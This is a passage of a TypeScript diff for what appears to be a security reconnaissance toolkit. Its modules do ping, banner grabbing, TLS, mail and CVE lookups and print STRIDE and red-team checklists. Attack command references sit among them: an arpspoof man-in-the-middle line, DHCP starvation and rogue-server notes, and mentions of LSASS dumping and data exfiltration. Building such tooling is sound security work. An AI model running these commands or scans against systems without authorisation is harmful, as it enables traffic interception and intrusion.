+    lines.push(`[ERROR] ${(err as Error).message}`);
+  }
+  lines.push(`[CMD] dig AXFR ${domain} @<nameserver>`);
+  lines.push(`[DONE] Lookup complete.`);
+  return lines;
+}
+
+async function fetchDhcpProbeLines(moduleId: number, target: string): Promise<string[]> {
+  const lines: string[] = [];
+  lines.push(`[MODULE ${moduleId}] DHCP PROBE — DHCP network analysis and rogue server detection`);
+  lines.push(`[TARGET/SUBNET] ${target}`);
+  lines.push(`[NOTE] Active DHCP probing requires raw UDP (Layer 2) — not available from cloud`);
+  lines.push(`──────────────────────────────────────────────`);
+  lines.push(`[DHCP STARVATION] Exhaust IP pool with fake DISCOVER packets`);
+  lines.push(`  Defense: DHCP snooping on switches, rate limiting`);
+  lines.push(`[ROGUE DHCP] Deploy unauthorized server → route traffic through attacker`);
+  lines.push(`  Defense: DHCP snooping, 802.1X port auth, monitor for duplicate offers`);
+  lines.push(`[SCAN CMD] nmap -sU -p 67,68 --script broadcast-dhcp-discover`);
+  lines.push(`[WIRESHARK] udp.port == 67 or udp.port == 68`);
+  lines.push(`[DONE] Lookup complete.`);
+  return lines;
+}
+
+async function fetchArpScanLines(moduleId: number, target: string): Promise<string[]> {
+  const lines: string[] = [];
+  lines.push(`[MODULE ${moduleId}] ARP SCAN — Layer 2 network host discovery`);
+  lines.push(`[TARGET/SUBNET] ${target}`);
+  lines.push(`[NOTE] ARP scanning requires Layer 2 access (same LAN segment)`);
+  lines.push(`──────────────────────────────────────────────`);
+  lines.push(`[SCAN COMMANDS]`);
+  lines.push(`  arp-scan --localnet               # scan local subnet`);
+  lines.push(`  arp-scan ${target}      # scan specific range`);
+  lines.push(`  nmap -PR -sn ${target}            # nmap ARP ping`);
+  lines.push(`  netdiscover -r ${target}          # passive discovery`);
+  lines.push(`──────────────────────────────────────────────`);
+  lines.push(`[ARP SPOOFING] arpspoof -i eth0 -t VICTIM GATEWAY`);
+  lines.push(`  Effect: Route victim traffic through attacker (MitM)`);
+  lines.push(`  Detection: arpwatch, XArp, dynamic ARP inspection`);
+  lines.push(`[OUI LOOKUP] https://macvendors.com/ (first 3 MAC octets)`);
+  lines.push(`[DONE] Lookup complete.`);
+  return lines;
+}
+
+async function fetchIcmpProbeLines(moduleId: number, target: string): Promise<string[]> {
+  const lines: string[] = [];
+  const host = target.split(':')[0].trim().replace(/[^a-zA-Z0-9._-]/g, '');
+  lines.push(`[MODULE ${moduleId}] ICMP PROBE — host reachability + round-trip time`);
+  lines.push(`[TARGET] ${host}`);
+  return new Promise((resolve) => {
+    const proc = spawn('ping', ['-c', '4', '-W', '3', host]);
+    const out: string[] = [];
+    proc.stdout.on('data', (d: Buffer) => out.push(...d.toString().split('\n')));
+    proc.stderr.on('data', (d: Buffer) => out.push(...d.toString().split('\n')));
+    proc.on('close', () => {
+      for (const line of out.filter(l => l.trim()).slice(0, 20)) lines.push(`[PING] ${line}`);
+      if (out.length === 0) lines.push(`[RESULT] Host unreachable or ICMP blocked by firewall`);
+      lines.push(`[NOTE] Many hosts block ICMP — use TCP probe for port 80/443`);
+      lines.push(`[DONE] Lookup complete.`);
+      resolve(lines);
+    });
+    proc.on('error', () => {
+      lines.push(`[RESULT] ping unavailable — use Module 130 (OPEN PORTS) instead`);
+      lines.push(`[DONE] Lookup complete.`);
+      resolve(lines);
+    });
+    setTimeout(() => { proc.kill(); if (!lines.some(l => l.includes('[DONE]'))) { lines.push(`[DONE] Lookup complete.`); resolve(lines); } }, 14000);
+  });
+}
+
+async function fetchOsFingerprintLines(moduleId: number, target: string): Promise<string[]> {
+  const lines: string[] = [];
+  const host = target.split(':')[0].trim().replace(/[^a-zA-Z0-9._-]/g, '');
+  lines.push(`[MODULE ${moduleId}] OS FINGERPRINT — OS detection via HTTP banner analysis`);
+  lines.push(`[TARGET] ${host}`);
+  for (const scheme of ['https', 'http']) {
+    try {
+      const res = await fetch(`${scheme}://${host}`, {
+        headers: { 'User-Agent': 'Mozilla/5.0 (compatible; SentinelBot/1.0)' },
+        signal: AbortSignal.timeout(6000),
+      });
+      const server = res.headers.get('server') ?? '';
+      const powered = res.headers.get('x-powered-by') ?? '';
+      if (server) {
+        lines.push(`[${scheme.toUpperCase()} SERVER] ${server}`);
+        if (server.toLowerCase().includes('apache')) lines.push(`[OS HINT] Apache → likely Linux`);
+        else if (server.toLowerCase().includes('nginx')) lines.push(`[OS HINT] Nginx → likely Linux`);
+        else if (server.toLowerCase().includes('iis')) lines.push(`[OS HINT] IIS → Windows Server`);
+        else if (server.toLowerCase().includes('cloudflare')) lines.push(`[OS HINT] Cloudflare → origin OS masked`);
+      }
+      if (powered) lines.push(`[X-POWERED-BY] ${powered}`);
+      break;
+    } catch { /* try next */ }
+  }
+  lines.push(`──────────────────────────────────────────────`);
+  lines.push(`[TTL REFERENCE] 64=Linux/Mac | 128=Windows | 255=Cisco`);
+  lines.push(`[ACCURATE] nmap -O ${host} (requires root)`);
+  lines.push(`[DONE] Lookup complete.`);
+  return lines;
+}
+
+async function fetchServiceVerLines(moduleId: number, target: string): Promise<string[]> {
+  const lines: string[] = [];
+  const host = target.split(':')[0].trim().replace(/[^a-zA-Z0-9._-]/g, '');
+  lines.push(`[MODULE ${moduleId}] SERVICE VERSION — banner grab + version detection`);
+  lines.push(`[TARGET] ${host}`);
+  const services = [
+    {port:21,name:'FTP'},{port:22,name:'SSH'},{port:25,name:'SMTP'},
+    {port:80,name:'HTTP'},{port:443,name:'HTTPS'},{port:3306,name:'MySQL'},
+    {port:5432,name:'PostgreSQL'},{port:6379,name:'Redis'},{port:27017,name:'MongoDB'},
+  ];
+  const grabs = await Promise.allSettled(services.map(({port, name}) =>
+    new Promise<{port: number; name: string; banner: string}>((resolve) => {
+      const socket = new net.Socket();
+      socket.setTimeout(4000);
+      let data = '';
+      socket.connect(port, host, () => { if (port === 80) socket.write('HEAD / HTTP/1.0\r\n\r\n'); });
+      socket.on('data', (d) => { data += d.toString(); if (data.length > 300) socket.destroy(); });
+      socket.on('error', () => resolve({port, name, banner: ''}));
+      socket.on('timeout', () => { socket.destroy(); resolve({port, name, banner: ''}); });
+      socket.on('close', () => resolve({port, name, banner: data.trim().split('\n')[0]?.slice(0, 100) ?? ''}));
+    })
+  ));
+  let found = 0;
+  for (const r of grabs) {
+    if (r.status === 'fulfilled' && r.value.banner) {
+      lines.push(`[${r.value.port}/${r.value.name}] ${r.value.banner}`);
+      found++;
+    }
+  }
+  if (found === 0) lines.push(`[RESULT] No banners retrieved — host may be filtered`);
+  lines.push(`[FULL SCAN] nmap -sV --version-intensity 5 ${host}`);
+  lines.push(`[DONE] Lookup complete.`);
+  return lines;
+}
+
+async function fetchVulnScanLines(moduleId: number, target: string): Promise<string[]> {
+  const lines: string[] = [];
+  lines.push(`[MODULE ${moduleId}] VULN SCAN — NVD vulnerability lookup for target service`);
+  lines.push(`[TARGET/SERVICE] ${target}`);
+  try {
+    const res = await fetch(`https://services.nvd.nist.gov/rest/json/cves/2.0?keywordSearch=${encodeURIComponent(target)}&resultsPerPage=8`, {
+      headers: { 'User-Agent': 'SentinelBot/1.0' },
+      signal: AbortSignal.timeout(15000),
+    });
+    if (res.ok) {
+      const data = await res.json() as { totalResults?: number; vulnerabilities?: Array<{cve: {id: string; descriptions: Array<{lang: string; value: string}>; metrics?: Record<string, unknown>; published?: string}}>};
+      lines.push(`[NVD] ${data.totalResults ?? 0} CVEs for "${target}"`);
+      for (const v of (data.vulnerabilities ?? []).slice(0, 6)) {
+        const cve = v.cve;
+        const desc = cve.descriptions.find(d => d.lang === 'en')?.value ?? '';
+        const score = ((cve.metrics?.['cvssMetricV31'] as Array<Record<string, unknown>>)?.[0]?.['cvssData'] as Record<string, unknown> | undefined);
+        lines.push(`──────────────────────────────────────────────`);
+        lines.push(`[${cve.id}] CVSS: ${score?.['baseScore'] ?? 'n/a'} ${score?.['baseSeverity'] ?? ''}`);
+        lines.push(`[DESC] ${desc.slice(0, 180)}`);
+        lines.push(`[NVD] https://nvd.nist.gov/vuln/detail/${cve.id}`);
+      }
+    } else {
+      lines.push(`[NVD] HTTP ${res.status} — rate limited, retry in 30s`);
+    }
+  } catch (err) {
+    lines.push(`[ERROR] ${(err as Error).message}`);
+  }
+  lines.push(`[DONE] Lookup complete.`);
+  return lines;
+}
+
+async function fetchExploitSearchLines(moduleId: number, target: string): Promise<string[]> {
+  const lines: string[] = [];
+  lines.push(`[MODULE ${moduleId}] EXPLOIT SEARCH — exploit-db + Metasploit reference`);
+  lines.push(`[TARGET/SERVICE] ${target}`);
+  lines.push(`[SEARCHSPLOIT] searchsploit "${target}"`);
+  lines.push(`[MSF] msf6 > search type:exploit name:${target.split(' ')[0]}`);
+  lines.push(`[EXPLOIT-DB] https://www.exploit-db.com/search?q=${encodeURIComponent(target)}`);
+  lines.push(`[PACKETSTORM] https://packetstormsecurity.com/search/?q=${encodeURIComponent(target)}`);
+  lines.push(`[VULHUB] https://vulhub.org/ — Docker-based PoC lab environments`);
+  try {
+    const res = await fetch(`https://services.nvd.nist.gov/rest/json/cves/2.0?keywordSearch=${encodeURIComponent(target)}&resultsPerPage=5&cvssV3Severity=CRITICAL`, {
+      headers: { 'User-Agent': 'SentinelBot/1.0' },
+      signal: AbortSignal.timeout(12000),
+    });
+    if (res.ok) {
+      const data = await res.json() as { vulnerabilities?: Array<{cve: {id: string; descriptions: Array<{lang: string; value: string}>; published?: string}}>};
+      const vulns = data.vulnerabilities ?? [];
+      if (vulns.length > 0) {
+        lines.push(`──────────────────────────────────────────────`);
+        lines.push(`[NVD CRITICAL CVEs] (${vulns.length} found)`);
+        for (const v of vulns.slice(0, 4)) {
+          const desc = v.cve.descriptions.find(d => d.lang === 'en')?.value ?? '';
+          lines.push(`  [${v.cve.id}] ${desc.slice(0, 120)}`);
+          lines.push(`    https://nvd.nist.gov/vuln/detail/${v.cve.id}`);
+        }
+      }
+    }
+  } catch { /* skip */ }
+  lines.push(`[DONE] Lookup complete.`);
+  return lines;
+}
+
+async function fetchZeroDayRefLines(moduleId: number, target: string): Promise<string[]> {
+  const lines: string[] = [];
+  lines.push(`[MODULE ${moduleId}] ZERO DAY REFERENCE — recent critical CVEs + active exploitation`);
+  lines.push(`[FILTER] ${target || 'recent critical'}`);
+  try {
+    const query = target.trim();
+    const url = `https://services.nvd.nist.gov/rest/json/cves/2.0?cvssV3Severity=CRITICAL&resultsPerPage=8${query ? `&keywordSearch=${encodeURIComponent(query)}` : ''}`;
+    const res = await fetch(url, { headers: { 'User-Agent': 'SentinelBot/1.0' }, signal: AbortSignal.timeout(15000) });
+    if (res.ok) {
+      const data = await res.json() as { totalResults?: number; vulnerabilities?: Array<{cve: {id: string; descriptions: Array<{lang: string; value: string}>; published?: string}}>};
+      lines.push(`[NVD] ${data.totalResults ?? 0} CRITICAL CVEs`);
+      for (const v of (data.vulnerabilities ?? []).slice(0, 6)) {
+        const desc = v.cve.descriptions.find(d => d.lang === 'en')?.value ?? '';
+        lines.push(`──────────────────────────────────────────────`);
+        lines.push(`[${v.cve.id}]  ${v.cve.published?.slice(0, 10) ?? ''}`);
+        lines.push(`[DESC] ${desc.slice(0, 180)}`);
+        lines.push(`[NVD] https://nvd.nist.gov/vuln/detail/${v.cve.id}`);
+      }
+    }
+  } catch (err) {
+    lines.push(`[ERROR] ${(err as Error).message}`);
+  }
+  lines.push(`──────────────────────────────────────────────`);
+  lines.push(`[FEEDS] CISA KEV: https://www.cisa.gov/known-exploited-vulnerabilities-catalog`);
+  lines.push(`[DONE] Lookup complete.`);
+  return lines;
+}
+
+async function fetchCveDetailsLines(moduleId: number, target: string): Promise<string[]> {
+  const lines: string[] = [];
+  const cveId = target.trim().toUpperCase();
+  lines.push(`[MODULE ${moduleId}] CVE DETAILS — NVD full record`);
+  lines.push(`[CVE] ${cveId}`);
+  try {
+    const res = await fetch(`https://services.nvd.nist.gov/rest/json/cves/2.0?cveId=${encodeURIComponent(cveId)}`, {
+      headers: { 'User-Agent': 'SentinelBot/1.0' },
+      signal: AbortSignal.timeout(15000),
+    });
+    if (!res.ok) throw new Error(`NVD HTTP ${res.status}`);
+    const data = await res.json() as {vulnerabilities?: Array<{cve: Record<string, unknown>}>};
+    const vuln = data.vulnerabilities?.[0]?.cve as Record<string, unknown>;
+    if (!vuln) { lines.push(`[RESULT] CVE not found in NVD`); return lines; }
+    const desc = (vuln["descriptions"] as Array<{lang: string; value: string}>).find(d => d.lang === 'en')?.value ?? '';
+    lines.push(`[STATUS] ${vuln["vulnStatus"] ?? ''}`);
+    lines.push(`[PUBLISHED] ${(vuln["published"] as string ?? '').slice(0, 10)}`);
+    lines.push(`[MODIFIED] ${(vuln["lastModified"] as string ?? '').slice(0, 10)}`);
+    lines.push(`[DESCRIPTION] ${desc.slice(0, 400)}`);
+    const metrics = vuln["metrics"] as Record<string, unknown> ?? {};
+    const v31 = (metrics["cvssMetricV31"] as Array<Record<string, unknown>>)?.[0];
+    if (v31) {
+      const d = v31["cvssData"] as Record<string, unknown>;
+      lines.push(`──────────────────────────────────────────────`);
+      lines.push(`[CVSS 3.1] ${d["baseScore"]} — ${d["baseSeverity"]}`);
+      lines.push(`[VECTOR] ${d["vectorString"]}`);
+      lines.push(`  AV:${d["attackVector"]} AC:${d["attackComplexity"]} PR:${d["privilegesRequired"]} UI:${d["userInteraction"]}`);
+      lines.push(`  C:${d["confidentialityImpact"]} I:${d["integrityImpact"]} A:${d["availabilityImpact"]}`);
+    }
+    const refs = (vuln["references"] as Array<{url: string; tags?: string[]}> ?? []).slice(0, 5);
+    lines.push(`[REFERENCES]`);
+    for (const r of refs) lines.push(`  ▸ ${r.url}`);
+    lines.push(`[NVD] https://nvd.nist.gov/vuln/detail/${cveId}`);
+  } catch (err) {
+    lines.push(`[ERROR] ${(err as Error).message}`);
+  }
+  lines.push(`[DONE] Lookup complete.`);
+  return lines;
+}
+
+async function fetchThreatModelLines(moduleId: number, target: string): Promise<string[]> {
+  const lines: string[] = [];
+  lines.push(`[MODULE ${moduleId}] THREAT MODEL — STRIDE analysis`);
+  lines.push(`[SYSTEM] ${target}`);
+  const threats = [
+    ['S', 'SPOOFING', 'Authentication', 'Username enumeration | Credential stuffing | Session fixation | JWT alg confusion', 'MFA, lockout, consistent error messages'],
+    ['T', 'TAMPERING', 'Integrity', 'Parameter tampering | Mass assignment | SQLi/CMDi | MitM', 'Input validation, parameterized queries, HTTPS+HSTS'],
+    ['R', 'REPUDIATION', 'Non-repudiation', 'Missing audit logs | Log injection | Insufficient retention', 'Append-only logs, SIEM, digital signatures'],
+    ['I', 'INFO DISCLOSURE', 'Confidentiality', 'Verbose errors | IDOR | Secrets in logs | Broken access control', 'Need-to-know access, error handling, secret scanning'],
+    ['D', 'DENIAL OF SERVICE', 'Availability', 'Resource exhaustion | No rate limiting | ReDoS | HTTP flood', 'Rate limiting, WAF, CDN, autoscaling'],
+    ['E', 'ELEVATION OF PRIVILEGE', 'Authorization', 'IDOR | JWT claim manipulation | Path traversal | SSRF', 'RBAC, centralized authz, least privilege'],
+  ] as const;
+  lines.push(`═══════════════════════════════════════════════`);
+  for (const [letter, name, prop, examples, mitigation] of threats) {
+    lines.push(`[${letter}] ${name} — ${prop}`);
+    lines.push(`    Examples: ${examples}`);
+    lines.push(`    Mitigation: ${mitigation}`);
+    lines.push(``);
+  }
+  lines.push(`[TOOL] Microsoft Threat Modeling Tool, OWASP Threat Dragon`);
+  lines.push(`[DONE] Analysis complete.`);
+  return lines;
+}
+
+async function fetchRedTeamReportLines(moduleId: number, target: string): Promise<string[]> {
+  const lines: string[] = [];
+  lines.push(`[MODULE ${moduleId}] RED TEAM REPORT — structured assessment framework`);
+  lines.push(`[TARGET] ${target}`);
+  lines.push(`[PHASE 1] RECONNAISSANCE`);
+  lines.push(`  OSINT: whois, DNS, SSL cert, Shodan, LinkedIn, GitHub, job postings`);
+  lines.push(`  Active: Port scan, service detection, subdomain enum`);
+  lines.push(`  Tools: Maltego, Recon-ng, theHarvester, Amass`);
+  lines.push(`[PHASE 2] INITIAL ACCESS`);
+  lines.push(`  Phishing → credential harvest | Web App: SQLi, IDOR, Auth bypass`);
+  lines.push(`  VPN/RDP: Default creds, BlueKeep | Supply chain compromise`);
+  lines.push(`[PHASE 3] EXECUTION`);
+  lines.push(`  PowerShell bypass | LOLBins | Cobalt Strike / Sliver / Havoc C2`);
+  lines.push(`[PHASE 4] PERSISTENCE`);
+  lines.push(`  Registry Run keys | Scheduled tasks | WMI subscriptions | Golden ticket`);
+  lines.push(`[PHASE 5] PRIVILEGE ESCALATION`);
+  lines.push(`  Unquoted services | Weak perms | Token impersonation | Kerberoasting`);
+  lines.push(`[PHASE 6] LATERAL MOVEMENT`);
+  lines.push(`  Pass-the-Hash | Pass-the-Ticket | PsExec | SMB | SSH key reuse`);
+  lines.push(`[PHASE 7] COLLECTION & EXFILTRATION`);
+  lines.push(`  LSASS dump → mimikatz | Data staging | Exfil via DNS/HTTPS`);
+  lines.push(`[FRAMEWORKS] MITRE ATT&CK | PTES | OWASP Testing Guide | NIST 800-115`);
+  lines.push(`[DONE] Assessment framework complete.`);
+  return lines;
+}
+
+// ── CRYPTO / TLS MODULES (173-179) ────────────────────────────────────────────
+
+async function fetchKeyStrengthLines(moduleId: number, target: string): Promise<string[]> {
+  const lines: string[] = [];
+  lines.push(`[MODULE ${moduleId}] KEY STRENGTH — cryptographic key and password strength analysis`);
+  lines.push(`[INPUT] ${target.slice(0, 80)}${target.length > 80 ? '...' : ''}`);
+  const t = target.trim();
+  const isPem = t.startsWith('-----BEGIN');
+  if (isPem) {
+    lines.push(`[TYPE] PEM-encoded key`);
+    const bits = t.match(/(\d+) bit/i)?.[1] ?? '';
+    if (bits) lines.push(`[KEY SIZE] ${bits} bits`);
+    if (t.includes('RSA')) {
+      lines.push(`[ALGORITHM] RSA`);
+      const kb = parseInt(bits || '0');
+      lines.push(kb < 2048 ? `[⚠ WEAK] RSA < 2048 bits` : kb < 4096 ? `[OK] RSA 2048 bits — acceptable, 4096 preferred` : `[STRONG] RSA 4096 bits`);
+    } else if (t.includes('EC')) {
+      lines.push(`[ALGORITHM] Elliptic Curve`);
+      lines.push(`[OK] P-256 (128-bit security) | P-384 (192-bit) | P-521 (256-bit)`);
+    }
+  } else {
+    const length = t.length;
+    const hasUpper = /[A-Z]/.test(t), hasLower = /[a-z]/.test(t);
+    const hasNum = /[0-9]/.test(t), hasSpecial = /[^A-Za-z0-9]/.test(t);
+    const charSpace = (hasUpper ? 26 : 0) + (hasLower ? 26 : 0) + (hasNum ? 10 : 0) + (hasSpecial ? 32 : 0);
+    const entropy = charSpace > 0 ? (length * Math.log2(charSpace)).toFixed(1) : '0';
+    const e = parseFloat(entropy);
+    lines.push(`[TYPE] Password / Secret`);
+    lines.push(`[LENGTH] ${length} chars  [CHARSET] ${hasUpper?'A-Z ':''} ${hasLower?'a-z ':''} ${hasNum?'0-9 ':''} ${hasSpecial?'special':''}`);
+    lines.push(`[ENTROPY] ~${entropy} bits`);
+    lines.push(e < 40 ? `[⚠ WEAK] Very low — trivially crackable` : e < 60 ? `[MODERATE] Brute-forceable with GPU cluster` : e < 80 ? `[GOOD] Sufficient for most uses` : `[STRONG] High entropy — excellent`);
+    lines.push(`[REFERENCE] <40=seconds | 40-60=hours-days | 60-80=years | 80+=infeasible`);
+  }
+  lines.push(`[DONE] Analysis complete.`);
+  return lines;
+}
+
+async function fetchCipherSuiteLines(moduleId: number, target: string): Promise<string[]> {
+  const lines: string[] = [];
+  const filter = target.toLowerCase().trim();
+  lines.push(`[MODULE ${moduleId}] CIPHER SUITE REFERENCE — TLS cipher security guide`);
+  lines.push(`[FILTER] ${target || 'all'}`);
+  const suites = [
+    ['TLS_AES_256_GCM_SHA384', 'TLS 1.3', '✓ RECOMMENDED'],
+    ['TLS_AES_128_GCM_SHA256', 'TLS 1.3', '✓ RECOMMENDED'],
+    ['TLS_CHACHA20_POLY1305_SHA256', 'TLS 1.3', '✓ RECOMMENDED'],
+    ['ECDHE-RSA-AES256-GCM-SHA384', 'TLS 1.2', '✓ GOOD (PFS)'],
+    ['ECDHE-RSA-AES128-GCM-SHA256', 'TLS 1.2', '✓ GOOD (PFS)'],
+    ['ECDHE-RSA-CHACHA20-POLY1305', 'TLS 1.2', '✓ GOOD (PFS)'],
+    ['DHE-RSA-AES256-GCM-SHA384', 'TLS 1.2', '✓ GOOD (PFS)'],
+    ['AES256-GCM-SHA384', 'TLS 1.2', '⚠ NO PFS (RSA kex)'],
+    ['AES128-SHA256', 'TLS 1.2', '⚠ WEAK (CBC mode)'],
+    ['RC4-SHA', 'TLS 1.0/1.1', '✗ BROKEN'],
+    ['DES-CBC3-SHA', 'TLS 1.0', '✗ BROKEN (SWEET32)'],
+    ['EXPORT-RC4-MD5', 'legacy', '✗ BROKEN (FREAK)'],
+    ['NULL-MD5', 'all', '✗ CRITICALLY BROKEN'],
+  ] as const;
+  const filtered = filter ? suites.filter(s => s[0].toLowerCase().includes(filter) || s[2].toLowerCase().includes(filter)) : suites;
+  for (const [name, proto, status] of filtered) lines.push(`[${status}] ${name}  (${proto})`);
+  lines.push(`──────────────────────────────────────────────`);
+  lines.push(`[SCAN] testssl.sh --ciphersuites https://target.com`);
+  lines.push(`[ONLINE] https://www.ssllabs.com/ssltest/`);
+  lines.push(`[DONE] Reference complete.`);
+  return lines;
+}
+
+async function fetchTlsAnalyzerLines(moduleId: number, target: string): Promise<string[]> {
+  const lines: string[] = [];
+  let host = target.trim().replace(/^https?:\/\//, '').split('/')[0];
+  const portStr = host.includes(':') ? host.split(':')[1] : '443';
+  host = host.split(':')[0]!;
+  const port = parseInt(portStr ?? '443');
+  lines.push(`[MODULE ${moduleId}] TLS ANALYZER — full TLS handshake + cipher + certificate analysis`);
+  lines.push(`[TARGET] ${host}:${port}`);
+  return new Promise((resolve) => {
+    try {
+      const socket = tls.connect(port, host, { servername: host, rejectUnauthorized: false, timeout: 8000 }, () => {
+        try {
+          const cert = socket.getPeerCertificate(true);
+          const proto = socket.getProtocol();
+          const cipher = socket.getCipher();
+          lines.push(`[PROTOCOL] ${proto ?? 'unknown'}`);
+          lines.push(`[CIPHER] ${cipher?.name ?? 'unknown'} (${cipher?.version ?? ''})`);
+          if (cert?.subject) {
+            lines.push(`──────────────────────────────────────────────`);
+            lines.push(`[CERT CN] ${cert.subject.CN ?? 'n/a'}`);
+            lines.push(`[ISSUER] ${cert.issuer?.O ?? cert.issuer?.CN ?? 'n/a'}`);
+            lines.push(`[VALID FROM] ${cert.valid_from}`);
+            lines.push(`[VALID TO] ${cert.valid_to}`);
+            const daysLeft = Math.ceil((new Date(cert.valid_to).getTime() - Date.now()) / 86400000);
+            lines.push(daysLeft < 0 ? `[⚠ EXPIRED] ${-daysLeft} days ago` : daysLeft < 30 ? `[⚠ EXPIRING] ${daysLeft} days left` : `[EXPIRES IN] ${daysLeft} days`);
+            if (cert.subjectaltname) lines.push(`[SAN] ${cert.subjectaltname.slice(0, 300)}`);
+            lines.push(`[FINGERPRINT] ${cert.fingerprint256 ?? cert.fingerprint ?? 'n/a'}`);
+          }
+          lines.push(`──────────────────────────────────────────────`);
+          if (proto === 'TLSv1' || proto === 'TLSv1.1') lines.push(`[⚠ WEAK PROTOCOL] ${proto} is deprecated (RFC 8996)`);
+          else if (proto === 'TLSv1.2') lines.push(`[OK] TLS 1.2 — acceptable, prefer 1.3`);
+          else if (proto === 'TLSv1.3') lines.push(`[✓ EXCELLENT] TLS 1.3`);
+          const cn = cipher?.name ?? '';
+          if (cn.includes('RC4')) lines.push(`[⚠ BROKEN] RC4 cipher`);
+          else if (cn.includes('CBC')) lines.push(`[CAUTION] CBC mode — padding oracle risk`);
+          else if (cn.includes('GCM')) lines.push(`[✓ GOOD] GCM authenticated encryption`);
+          socket.destroy();
+        } catch (e) { lines.push(`[ERROR] ${(e as Error).message}`); socket.destroy(); }
+        lines.push(`[FULL SCAN] testssl.sh --full https://${host}`);
+        lines.push(`[ONLINE] https://www.ssllabs.com/ssltest/analyze.html?d=${host}`);
+        lines.push(`[DONE] Analysis complete.`);
+        resolve(lines);
+      });
+      socket.on('error', (err) => { lines.push(`[ERROR] ${err.message}`); lines.push(`[DONE] Analysis complete.`); resolve(lines); });
+      socket.on('timeout', () => { lines.push(`[TIMEOUT]`); socket.destroy(); lines.push(`[DONE] Analysis complete.`); resolve(lines); });
+    } catch (err) { lines.push(`[ERROR] ${(err as Error).message}`); lines.push(`[DONE] Analysis complete.`); resolve(lines); }
+  });
+}
+
+async function fetchMailSecurityLines(moduleId: number, target: string): Promise<string[]> {
+  const lines: string[] = [];
+  const domain = target.trim().replace(/^https?:\/\//, '').split('/')[0].replace(/^.*@/, '');
+  lines.push(`[MODULE ${moduleId}] MAIL SECURITY — SPF + DMARC + MX aggregate check`);
+  lines.push(`[DOMAIN] ${domain}`);
+  try {
+    const mx = await dns.resolveMx(domain).catch(() => [] as Array<{exchange: string; priority: number}>);
+    lines.push(`──────────────────────────────────────────────`);
+    lines.push(`[MX RECORDS] ${mx.length} found`);
+    for (const r of mx.sort((a, b) => a.priority - b.priority).slice(0, 3)) {
+      lines.push(`  Priority ${r.priority}: ${r.exchange}`);
+    }
+    const txt = await dns.resolveTxt(domain).catch(() => [] as string[][]);
+    const spf = txt.find(r => r.join('').startsWith('v=spf1'));
+    lines.push(`──────────────────────────────────────────────`);
+    if (spf) {
+      const spfStr = spf.join('');
+      lines.push(`[SPF] ${spfStr.slice(0, 200)}`);
+      lines.push(`[SPF POLICY] ${spfStr.includes('-all') ? '-all (HARD FAIL) — excellent' : spfStr.includes('~all') ? '~all (SOFT FAIL) — ok' : spfStr.includes('+all') ? '+all — DANGEROUS' : '?all (neutral)'}`);
+    } else {
+      lines.push(`[⚠ SPF] Missing — spoofing risk`);
+    }
+    const dmarcTxt = await dns.resolveTxt(`_dmarc.${domain}`).catch(() => [] as string[][]);
+    const dmarc = dmarcTxt.find(r => r.join('').startsWith('v=DMARC1'));
+    lines.push(`──────────────────────────────────────────────`);
+    if (dmarc) {
+      const str = dmarc.join('');
+      const policy = str.match(/p=(\w+)/)?.[1];
+      lines.push(`[DMARC] ${str.slice(0, 250)}`);
+      lines.push(`[DMARC POLICY] ${policy === 'reject' ? 'reject — strongest' : policy === 'quarantine' ? 'quarantine — good' : 'none — monitoring only, no enforcement'}`);
+    } else {
+      lines.push(`[⚠ DMARC] Missing — phishing risk`);
+    }
+    const mtaSts = await dns.resolveTxt(`_mta-sts.${domain}`).catch(() => [] as string[][]);
+    lines.push(`[MTA-STS] ${mtaSts.length > 0 ? mtaSts[0]!.join('') : 'Not configured'}`);
+    lines.push(`──────────────────────────────────────────────`);
+    const score = [spf, dmarc, mx.length > 0].filter(Boolean).length;
+    lines.push(`[OVERALL] ${score}/3 key controls configured`);
+  } catch (err) {
+    lines.push(`[ERROR] ${(err as Error).message}`);
+  }
+  lines.push(`[CHECK] https://mxtoolbox.com/SuperTool.aspx?action=email&input=${domain}`);
+  lines.push(`[DONE] Lookup complete.`);
+  return lines;
+}
+
+async function fetchHibpEmailLines(moduleId: number, target: string): Promise<string[]> {
+  const lines: string[] = [];
+  const email = target.trim();
+  lines.push(`[MODULE ${moduleId}] HIBP EMAIL — multi-source email breach scan`);
+  lines.push(`[EMAIL] ${email}`);
+
+  const domain = email.split('@')[1] ?? '';
+
+  // ── LeakCheck.io — real breach lookup (free) ──────────────────────────────
+  try {
+    const lcRes = await fetch(`https://leakcheck.io/api/public?check=${encodeURIComponent(email)}`, {
+      headers: { 'User-Agent': 'swept-sentinel-osint', 'Accept': 'application/json' },
+      signal: AbortSignal.timeout(10000),
+    });
+    if (lcRes.ok) {
+      const lc = await lcRes.json() as { success?: boolean; found?: number; fields?: string[]; sources?: Array<{name?: string; date?: string}> };
+      if (lc.success) {
+        const found = lc.found ?? 0;
+        lines.push(`[LEAKCHECK.IO] ${found > 0 ? `⚠ FOUND IN ${found} BREACH SOURCE(S)` : 'Email not found in indexed breach database'}`);
+        if (found > 0) {
+          if (lc.fields?.length) lines.push(`[EXPOSED DATA] ${lc.fields.join(', ')}`);
+          const dangerous = (lc.fields ?? []).filter(f => ['password', 'ssn', 'dob', 'ip', 'phone', 'address'].includes(f));
+          if (dangerous.length) lines.push(`[⚠ HIGH-RISK] ${dangerous.join(', ')} exposed`);
+          lines.push(`[BREACH SOURCES]`);
+          for (const s of (lc.sources ?? []).slice(0, 12)) {
+            lines.push(`  ▸ ${s.name ?? 'Unknown'}${s.date ? `  [${s.date}]` : ''}`);
+          }
+        }
+      } else {
+        lines.push(`[LEAKCHECK.IO] No result returned`);
+      }
+    } else {
+      lines.push(`[LEAKCHECK.IO] HTTP ${lcRes.status}`);
+    }
+  } catch (err) {
+    lines.push(`[LEAKCHECK.IO] ${(err as Error).message}`);
+  }
+
+  // ── OTX email + domain threat intel ───────────────────────────────────────
+  lines.push(`──────────────────────────────────────────────`);
+  try {
+    const apiKey = process.env.OTX_API_KEY;
+    if (apiKey && domain) {
+      const [emailRes, domainRes] = await Promise.allSettled([
+        fetch(`https://otx.alienvault.com/api/v1/indicators/email/${encodeURIComponent(email)}/general`, {
+          headers: { 'X-OTX-API-KEY': apiKey }, signal: AbortSignal.timeout(8000),
+        }),
+        fetch(`https://otx.alienvault.com/api/v1/indicators/domain/${encodeURIComponent(domain)}/general`, {
+          headers: { 'X-OTX-API-KEY': apiKey }, signal: AbortSignal.timeout(8000),
+        }),
+      ]);
+      if (emailRes.status === 'fulfilled' && emailRes.value.ok) {
+        const d = await emailRes.value.json() as Record<string, unknown>;
+        const pulses = ((d["pulse_info"] as Record<string, unknown>)?.["count"] as number) ?? 0;
